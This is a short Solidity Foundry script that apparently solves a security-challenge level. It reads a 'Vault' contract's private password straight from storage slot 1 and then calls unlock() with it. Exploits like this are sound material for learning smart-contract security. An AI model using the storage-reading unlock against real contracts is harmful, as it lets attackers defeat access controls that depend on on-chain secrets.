// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instance/Vault.sol";
import "forge-std/Script.sol";

contract Level7 is Script {
    Vault _instance = Vault(0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 password = vm.load(address(_instance), bytes32(uint256(1)));
        console.log("Lock status: ", _instance.locked());
        console.log(uint256(password));
        _instance.unlock(password);
        console.log("Lock status now: ", _instance.locked());
        vm.stopBroadcast();
    }
}
